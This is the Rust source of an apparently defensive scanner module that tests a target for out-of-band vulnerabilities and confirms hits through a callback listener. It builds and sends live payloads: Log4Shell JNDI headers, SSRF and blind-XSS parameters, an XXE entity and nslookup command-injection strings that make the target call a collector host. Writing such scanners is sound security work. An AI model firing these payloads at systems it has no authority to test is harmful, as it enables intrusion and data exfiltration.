//! OAST / OOB Engine — out-of-band interaction testing with **confirmed callback correlation**.
//!
//! Unlike scanners that report "critical" just for planting a payload, every high/critical finding
//! here requires a verified hit on the Weissman OAST listener (`fuzz_oob::verify_oob_token_seen`).
//! When OAST is not configured, probes are still planted honestly as `info` with setup guidance.
//!
//! Vectors: Log4Shell JNDI, blind SSRF, blind/stored XSS, XXE, command-injection DNS, SOAP/XML,
//! PDF/SSRF render sinks, Host-header SSRF, and DNS exfiltration patterns.
//!
//! MITRE: T1190, T1090, T1059.007, T1552.005

use crate::engine_probes::{empty_ok, extract_host, http_client, normalize_url};
use crate::engine_result::{print_result, EngineResult};
use serde_json::{json, Value};
use std::collections::BTreeMap;
use std::time::Duration;
use uuid::Uuid;

const ENGINE_ID: &str = "oast_oob";
const POLL_ROUNDS: u32 = 4;
const POLL_INTERVAL_MS: u64 = 2500;

struct ProbeChannel {
    id: &'static str,
    label: &'static str,
    mitre: &'static str,
    /// Severity when callback is confirmed.
    confirmed_sev: &'static str,
}

const CHANNELS: &[ProbeChannel] = &[
    ProbeChannel {
        id: "log4shell",
        label: "Log4Shell JNDI (CVE-2021-44228)",
        mitre: "T1190",
        confirmed_sev: "critical",
    },
    ProbeChannel {
        id: "blind_ssrf",
        label: "Blind SSRF",
        mitre: "T1090",
        confirmed_sev: "critical",
    },
    ProbeChannel {
        id: "blind_xss",
        label: "Blind / stored XSS",
        mitre: "T1059.007",
        confirmed_sev: "high",
    },
    ProbeChannel {
        id: "xxe_oob",
        label: "Blind XXE",
        mitre: "T1190",
        confirmed_sev: "critical",
    },
    ProbeChannel {
        id: "cmd_dns",
        label: "Command injection DNS exfil",
        mitre: "T1059",
        confirmed_sev: "critical",
    },
    ProbeChannel {
        id: "host_ssrf",
        label: "Host-header SSRF",
        mitre: "T1090",
        confirmed_sev: "high",
    },
];

fn oast_finding(
    title: &str,
    severity: &str,
    mitre: &str,
    description: &str,
    target: &str,
    channel: &str,
    token: &str,
    verified: bool,
    extra: Value,
) -> Value {
    let mut f = json!({
        "type": ENGINE_ID,
        "title": title,
        "severity": severity,
        "mitre_attack": mitre,
        "description": description,
        "target": target,
        "channel": channel,
        "oast_token": token,
        "verification_method": if verified { "oob_oast_callback" } else { "oob_probe_planted" },
        "verified": verified,
    });
    if let Some(obj) = f.as_object_mut() {
        if let Some(map) = extra.as_object() {
            for (k, v) in map {
                obj.insert(k.clone(), v.clone());
            }
        }
    }
    f
}

fn urlencode(s: &str) -> String {
    s.chars()
        .map(|c| match c {
            'A'..='Z' | 'a'..='z' | '0'..='9' | '-' | '_' | '.' | '~' => c.to_string(),
            _ => format!("%{:02X}", c as u32),
        })
        .collect()
}

async fn poll_token(client: &reqwest::Client, token: &str) -> bool {
    for _ in 0..POLL_ROUNDS {
        if crate::fuzz_oob::verify_oob_token_seen_with_client(client, token).await {
            return true;
        }
        tokio::time::sleep(Duration::from_millis(POLL_INTERVAL_MS)).await;
    }
    false
}

/// Plant Log4Shell JNDI probes in common log-injection headers.
async fn plant_log4shell(client: &reqwest::Client, base: &str, _token: &str, embed: &str) -> bool {
    let jndi = format!("${{jndi:ldap://{embed}}}");
    let headers = [
        "User-Agent",
        "X-Forwarded-For",
        "X-Api-Version",
        "Referer",
        "X-Request-ID",
        "X-Client-IP",
        "X-Originating-IP",
        "X-Remote-IP",
        "X-Remote-Addr",
        "True-Client-IP",
    ];
    let mut sent = false;
    for h in headers {
        if client
            .get(base)
            .header(h, jndi.as_str())
            .send()
            .await
            .is_ok()
        {
            sent = true;
        }
    }
    sent
}

/// Blind SSRF via common URL parameters.
async fn plant_blind_ssrf(client: &reqwest::Client, base: &str, embed: &str) -> bool {
    let params = [
        "url",
        "uri",
        "path",
        "dest",
        "redirect",
        "callback",
        "webhook",
        "fetch",
        "src",
        "source",
        "target",
        "link",
        "goto",
        "next",
        "return",
        "continue",
        "ref",
        "site",
        "feed",
        "host",
        "domain",
        "endpoint",
        "proxy",
        "load",
        "request",
        "file",
        "document",
        "page",
        "to",
        "out",
        "view",
        "dir",
        "show",
        "navigation",
        "open",
        "img",
        "image",
        "picture",
        "avatar",
    ];
    let base_trim = base.trim_end_matches('/');
    let mut sent = false;
    for p in params {
        let u = format!("{base_trim}?{p}={}", urlencode(embed));
        if client.get(&u).send().await.is_ok() {
            sent = true;
        }
    }
    sent
}

/// Blind XSS via search/query parameters (script src callback).
async fn plant_blind_xss(client: &reqwest::Client, base: &str, embed: &str) -> bool {
    let payload = format!(r#"""><script src="{embed}"></script>"#);
    let enc = urlencode(&payload);
    let params = [
        "q", "search", "query", "s", "keyword", "name", "comment", "message", "text",
    ];
    let base_trim = base.trim_end_matches('/');
    let mut sent = false;
    for p in params {
        let u = format!("{base_trim}?{p}={enc}");
        if client.get(&u).send().await.is_ok() {
            sent = true;
        }
    }
    sent
}

/// Blind XXE OOB via XML POST to common API paths.
async fn plant_xxe_oob(client: &reqwest::Client, base: &str, embed: &str) -> bool {
    let host_part = embed
        .trim_start_matches("http://")
        .trim_start_matches("https://")
        .split('/')
        .next()
        .unwrap_or(embed);
    let xxe = format!(
        r#"<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "http://{host_part}/">]><r>&xxe;</r>"#
    );
    let paths = [
        "/api", "/api/xml", "/xml", "/soap", "/ws", "/upload", "/import", "/parse", "/feed",
        "/graphql",
    ];
    let base_trim = base.trim_end_matches('/');
    let mut sent = false;
    for path in paths {
        if client
            .post(format!("{base_trim}{path}"))
            .header("Content-Type", "application/xml")
            .body(xxe.clone())
            .send()
            .await
            .is_ok()
        {
            sent = true;
        }
    }
    sent
}

/// Command-injection DNS exfil patterns in common params.
async fn plant_cmd_dns(client: &reqwest::Client, base: &str, token: &str, domain: &str) -> bool {
    let payloads = [
        format!(";nslookup {token}.{domain}"),
        format!("|nslookup {token}.{domain}"),
        format!("`nslookup {token}.{domain}`"),
        format!("$(nslookup {token}.{domain})"),
        format!("&nslookup {token}.{domain}&"),
    ];
    let params = [
        "cmd", "exec", "command", "run", "ping", "host", "ip", "addr", "target",
    ];
    let base_trim = base.trim_end_matches('/');
    let mut sent = false;
    for p in params {
        for pl in &payloads {
            let u = format!("{base_trim}?{p}={}", urlencode(pl));
            if client.get(&u).send().await.is_ok() {
                sent = true;
            }
        }
    }
    sent
}

/// Host-header SSRF (cache poisoning / routing misconfig class).
async fn plant_host_ssrf(client: &reqwest::Client, base: &str, embed: &str) -> bool {
    let host_val = embed
        .trim_start_matches("http://")
        .trim_start_matches("https://")
        .split('/')
        .next()
        .unwrap_or(embed);
    client
        .get(base)
        .header("Host", host_val)
        .header("X-Forwarded-Host", host_val)
        .send()
        .await
        .is_ok()
}

struct PlantedProbe {
    channel: &'static str,
    token: String,
    embed: String,
    sent: bool,
}

async fn plant_all_channels(base: &str, domain: &str) -> Vec<PlantedProbe> {
    let client = http_client().await;
    let mut out = Vec::new();

    for ch in CHANNELS {
        let token = Uuid::new_v4().as_hyphenated().to_string();
        let embed = crate::fuzz_oob::oast_embed_url_for_token(&token)
            .unwrap_or_else(|| format!("http://{token}.{domain}/i"));

        let sent = match ch.id {
            "log4shell" => plant_log4shell(&client, base, &token, &embed).await,
            "blind_ssrf" => plant_blind_ssrf(&client, base, &embed).await,
            "blind_xss" => plant_blind_xss(&client, base, &embed).await,
            "xxe_oob" => plant_xxe_oob(&client, base, &embed).await,
            "cmd_dns" => plant_cmd_dns(&client, base, &token, domain).await,
            "host_ssrf" => plant_host_ssrf(&client, base, &embed).await,
            _ => false,
        };

        if sent {
            out.push(PlantedProbe {
                channel: ch.id,
                token,
                embed,
                sent: true,
            });
        }
    }
    out
}

fn channel_meta(id: &str) -> &'static ProbeChannel {
    CHANNELS.iter().find(|c| c.id == id).unwrap_or(&CHANNELS[0])
}

fn posture_summary(
    target: &str,
    host: &str,
    oast_enabled: bool,
    planted: usize,
    confirmed: usize,
    domain: &str,
) -> Value {
    let score = if !oast_enabled {
        50
    } else if confirmed > 0 {
        0
    } else if planted > 0 {
        85
    } else {
        100
    };
    json!({
        "type": ENGINE_ID,
        "category": "posture_summary",
        "summary": true,
        "title": format!("OAST/OOB posture: {confirmed} confirmed / {planted} planted"),
        "severity": if confirmed > 0 { "critical" } else if planted > 0 { "info" } else { "info" },
        "mitre_attack": "T1090",
        "description": format!(
            "Target `{host}`: {planted} OOB probe channel(s) planted, {confirmed} callback(s) confirmed via Weissman OAST listener. OAST correlation {}.",
            if oast_enabled { "enabled" } else { "disabled — set WEISSMAN_OAST_DOMAIN" }
        ),
        "target": target,
        "score": score,
        "oast_domain": domain,
        "oast_correlation_enabled": oast_enabled,
        "planted_channels": planted,
        "confirmed_callbacks": confirmed,
    })
}

pub async fn run_oast_oob_result(target: &str) -> EngineResult {
    if target.trim().is_empty() {
        return EngineResult::error("target required");
    }

    let base = normalize_url(target);
    let host = extract_host(target);
    let oast_enabled = crate::fuzz_oob::oast_correlation_enabled();
    let domain = crate::fuzz_oob::oast_hook_domain().unwrap_or_else(|| "not-configured".into());

    if !oast_enabled {
        let mut findings = vec![oast_finding(
            "OAST correlation not configured",
            "info",
            "T1090",
            "Set WEISSMAN_OAST_DOMAIN (and ensure WEISSMAN_OAST_LISTENER_URL points at your collector) to enable verified blind SSRF/XXE/Log4Shell callback correlation. Without it, this engine will not emit confirmed findings.",
            target,
            "setup",
            "",
            false,
            json!({
                "remediation": "export WEISSMAN_OAST_DOMAIN=oast.your-domain.example",
                "listener": std::env::var("WEISSMAN_OAST_LISTENER_URL").unwrap_or_else(|_| "http://127.0.0.1:9090".into()),
            }),
        )];
        findings.push(posture_summary(target, &host, false, 0, 0, &domain));
        return EngineResult::ok(
            findings,
            format!("{ENGINE_ID}: OAST not configured on {host}"),
        );
    }

    let planted = plant_all_channels(&base, &domain).await;
    if planted.is_empty() {
        return empty_ok(ENGINE_ID, target);
    }

    let client = http_client().await;
    let mut findings: Vec<Value> = Vec::new();
    let mut confirmed_by_channel: BTreeMap<String, bool> = BTreeMap::new();

    for probe in &planted {
        let meta = channel_meta(probe.channel);
        let verified = poll_token(&client, &probe.token).await;
        confirmed_by_channel.insert(probe.channel.to_string(), verified);

        if verified {
            findings.push(oast_finding(
                &format!("CONFIRMED: {} — OOB callback received", meta.label),
                meta.confirmed_sev,
                meta.mitre,
                &format!(
                    "Weissman OAST listener received a callback for token `{}` on channel `{}` after probing {}. This is a confirmed out-of-band interaction — the target initiated egress to the operator collector.",
                    probe.token, meta.label, base
                ),
                target,
                probe.channel,
                &probe.token,
                true,
                json!({
                    "embed_url": probe.embed,
                    "evidence": format!("oob_hit token={}", probe.token),
                    "remediation": "Block outbound egress from app tier; patch Log4j/XXE/SSRF sinks; validate all URL fetches server-side.",
                }),
            ));
        } else {
            findings.push(oast_finding(
                &format!("OOB probe planted: {}", meta.label),
                "info",
                meta.mitre,
                &format!(
                    "Planted {} probe referencing `{}` on {}. No callback observed within {}s — either not vulnerable or egress/DNS is blocked. Re-check the OAST dashboard or extend polling.",
                    meta.label, probe.embed, base, (POLL_ROUNDS as u64 * POLL_INTERVAL_MS) / 1000
                ),
                target,
                probe.channel,
                &probe.token,
                false,
                json!({ "embed_url": probe.embed }),
            ));
        }
    }

    let confirmed = confirmed_by_channel.values().filter(|&&v| v).count();
    let planted_count = planted.len();
    findings.insert(
        0,
        posture_summary(target, &host, true, planted_count, confirmed, &domain),
    );

    let msg = if confirmed > 0 {
        format!(
            "{ENGINE_ID}: {confirmed} CONFIRMED OOB callback(s) on {host} ({planted_count} channels probed)"
        )
    } else {
        format!(
            "{ENGINE_ID}: {planted_count} OOB probe(s) planted on {host}, 0 callbacks confirmed (monitor OAST listener)"
        )
    };

    EngineResult::ok(findings, msg)
}

pub async fn run_oast_oob(target: &str) {
    print_result(run_oast_oob_result(target).await);
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn urlencode_handles_script() {
        let s = urlencode("<script>");
        assert!(s.contains('%'));
        assert!(!s.contains('<'));
    }

    #[test]
    fn channel_meta_resolves() {
        let m = channel_meta("blind_ssrf");
        assert_eq!(m.id, "blind_ssrf");
        assert_eq!(m.confirmed_sev, "critical");
    }

    #[test]
    fn posture_summary_scores() {
        let v = posture_summary("https://x.test", "x.test", true, 3, 1, "oast.test");
        assert_eq!(v["confirmed_callbacks"], 1);
        assert_eq!(v["planted_channels"], 3);
    }

    #[tokio::test]
    async fn empty_target_errors() {
        assert!(!run_oast_oob_result("").await.success);
    }
}
